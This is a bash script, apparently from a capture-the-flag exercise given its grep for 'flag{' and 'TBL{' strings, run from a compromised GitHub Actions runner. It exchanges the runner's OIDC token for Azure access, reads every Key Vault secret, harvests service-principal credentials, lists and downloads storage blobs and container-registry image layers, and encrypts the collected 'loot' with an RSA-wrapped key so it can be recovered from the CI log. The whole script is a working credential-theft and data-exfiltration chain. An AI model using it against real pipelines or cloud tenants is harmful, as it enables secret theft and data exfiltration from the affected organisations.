#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"
AAD="${SC}login.microsoftonline.com"; STG="storage.azure.com"; ACRH="crtblplatprodx3euoz.azurecr.io"; KVH="vault.azure.net"
TENANT=$AZURE_TENANT_ID
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
echo "=== RUNNER SHELL PROOF ==="; id; hostname
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
sptok(){ curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=$1" -d "grant_type=client_credentials" --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
VT=$(curl -sS -X POST "${AAD}/${TENANT}/oauth2/v2.0/token" -d "client_id=${AZURE_CLIENT_ID}" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=${SC}${KVH}/.default" | jq -r '.access_token // empty')
L=$(curl -sS -H "Authorization: Bearer $VT" "${SC}kv-tbl-prod-x3euoz.${KVH}/secrets?api-version=7.4")
CREDS=""
for id in $(printf '%s' "$L" | jq -r '.value[]?.id // empty'); do
  V=$(curl -sS -H "Authorization: Bearer $VT" "$id?api-version=7.4" | jq -r '.value // empty')
  A=$(printf '%s' "$V" | jq -r '.appId // empty'); S=$(printf '%s' "$V" | jq -r '.clientSecret // empty')
  [ -n "$A" ] && [ -n "$S" ] && CREDS="$CREDS $A:$S"
done
ST=$(sptok "038bc35d-131d-4953-9985-ff4a245ccec1" "$(printf '%s' "$CREDS" | tr ' ' '\n' | grep '^038bc35d' | sed 's/^[^:]*://')" "${SC}${STG}/.default")
list(){ curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$1.blob.core.windows.net/$2?restype=container&comp=list"; }
say "=== CONFIG container blobs ==="
say "$(list sttblappcfgprodx3euoz config | tr '<' '\n<' | grep -E 'Name|Size|Content-Type' | head -60)"
say "=== EXPORTS container blobs ==="
say "$(list sttblbackupprodx3euoz exports | tr '<' '\n<' | grep -E 'Name|Size|Content-Type' | head -60)"
say "=== LOGS container blobs ==="
say "$(list sttblcilogsprodx3euoz logs | tr '<' '\n<' | grep -E 'Name|Size' | head -40)"
getb(){ curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-12-02" "${SC}$1.blob.core.windows.net/$2" | head -c 3000; }
for B in $(list sttblappcfgprodx3euoz config | tr '<' '\n' | sed -n 's/^Name>//p'); do
  say "=== BLOB config/$B ==="; say "$(getb sttblappcfgprodx3euoz "config/$B")"
done
for B in $(list sttblbackupprodx3euoz exports | tr '<' '\n' | sed -n 's/^Name>//p'); do
  say "=== BLOB exports/$B ==="; say "$(getb sttblbackupprodx3euoz "exports/$B")"
done
say "=== ACR pull ==="
for REPO in tebamoto-reporting-api catalog-api; do
  TK=$(curl -sS -G "${SC}${ACRH}/oauth2/token" --data-urlencode "service=${ACRH}" --data-urlencode "scope=repository:${REPO}:pull" | jq -r '.access_token // empty')
  say "REPO $REPO tags: $(curl -sS -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/tags/list")"
  MAN=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${ACRH}/v2/$REPO/manifests/latest")
  say "MANIFEST $REPO: $(printf '%s' "$MAN" | head -c 1500)"
  for D in $(printf '%s' "$MAN" | jq -r '.. | .digest? // empty' 2>/dev/null | sort -u | head -12); do
    say "  layer $D: $(curl -sS -L -H "Authorization: Bearer $TK" "${SC}${ACRH}/v2/$REPO/blobs/$D" -o /tmp/l.tgz -w '%{size_download}') bytes"
    say "    files: $(tar -tzf /tmp/l.tgz 2>/dev/null | head -20 | tr '\n' ' ')"
    say "    FLAGHITS: $(tar -xzf /tmp/l.tgz -O 2>/dev/null | grep -a -iE 'flag\{|TBL\{|FLAG' | head -5 | tr '\n' ' ')"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
